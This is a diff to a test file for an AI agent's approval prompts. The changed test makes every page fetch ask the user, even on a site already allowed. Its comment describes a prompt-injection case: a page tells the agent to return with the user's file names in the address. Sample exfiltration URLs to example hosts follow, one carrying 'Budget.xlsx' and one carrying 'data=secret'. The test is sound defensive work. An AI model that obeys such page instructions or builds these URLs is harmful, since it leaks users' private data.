@@ -204,7 +204,7 @@ test("an Allow for this task on a file change doesn't let PowerShell or a web pa
   assert.equal(cards.length, 2, "(a refused address isn't asked about at all)");
 });
 
-test("reading pages: Allow for this task covers that site, not the next one", async () => {
+test("reading pages: every page asks, even on a site allowed for the task, since an address can carry what was read", async () => {
   const { askUser } = await import("../src/approvals.js");
   const { ctx } = pc();
   const standing = new Set();
@@ -216,10 +216,11 @@ test("reading pages: Allow for this task covers that site, not the next one", as
     lookup: async () => false,
   };
   await runPcTool("fetch_page", { url: "https://news.example/a" }, c);
-  await runPcTool("fetch_page", { url: "https://news.example/b" }, c);
-  assert.deepEqual(cards, ["Read a page on news.example"], "the same site passes");
+  // The page said to come back with the user's file names in the address: same site, so it must still ask.
+  await runPcTool("fetch_page", { url: "https://news.example/b?files=Budget.xlsx" }, c);
   await runPcTool("fetch_page", { url: "https://elsewhere.example/?data=secret" }, c);
-  assert.deepEqual(cards, ["Read a page on news.example", "Read a page on elsewhere.example"], "another site asks");
+  assert.deepEqual(cards, ["Read a page on news.example", "Read a page on news.example", "Read a page on elsewhere.example"]);
+  assert.equal(standing.size, 0, "nothing is allowed for the rest of the task");
 });
 
 test("PowerShell that names a private place, in any usual spelling, is refused; everyday commands aren't", async () => {
